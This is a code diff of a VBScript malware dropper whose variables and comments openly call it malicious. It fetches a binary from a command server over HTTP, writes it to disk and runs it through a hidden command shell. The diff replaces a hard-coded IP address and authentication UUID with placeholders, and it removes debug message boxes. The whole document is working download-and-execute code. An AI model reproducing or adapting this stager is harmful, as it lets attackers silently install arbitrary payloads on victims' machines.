@@ -1,18 +1,16 @@
 Public SERVERADDRESS
-SERVERADDRESS = "http://104.237.4.83"
+SERVERADDRESS = "http://IPorDNS"
 Public CONFIGURATIONPATH
 CONFIGURATIONPATH = "/Configuration"
 Public HEADERS
-HEADERS = "5a968c26-b565-4b65-8445-9e87780cb8f9-01"
+HEADERS = "UUID-01" ' Server authentication
 Public COMMANDSTOEXE
 Public MALICIOUSURL
-MALICIOUSURL = "/MaliciousPath"
+MALICIOUSURL = "/MaliciousPath" ' To get the main malicious file
 Public HttpGetRequestVar
 Public DownloadFileFromServerVar
 
-Dim path
-'Call writeBinary("aaaa","main.exe")
-
+'=====Download the main malicious file and store it:=====
 Dim http
 Set http = CreateObject("Msxml2.ServerXMLHTTP")
 http.Open "GET", SERVERADDRESS+MALICIOUSURL , False
@@ -29,8 +27,6 @@ HttpGetRequestVar = response
 Dim FileName,BinaryCodeToExe
 FileName = HttpGetRequestVar(0)
 BinaryCodeToExe = HttpGetRequestVar(1)
-MsgBox(FileName)
-MsgBox(BinaryCodeToExe)
 Const adTypeBinary = 1
 Const adSaveCreateOverWrite = 2
 
@@ -49,6 +45,6 @@ BinaryStream.Write BinaryCodeToExe
 BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
 DownloadFileFromServerVar = FileName
 
-Set oShell = CreateObject ("WScript.Shell") 
-oShell.run "cmd.exe /c " + DownloadFileFromServerVar
-
+'=====Run the main malicious file:=====
+Set oShell = CreateObject ("WScript.Shell")
+oShell.Run "%comspec% /c " & DownloadFileFromServerVar, 0, True
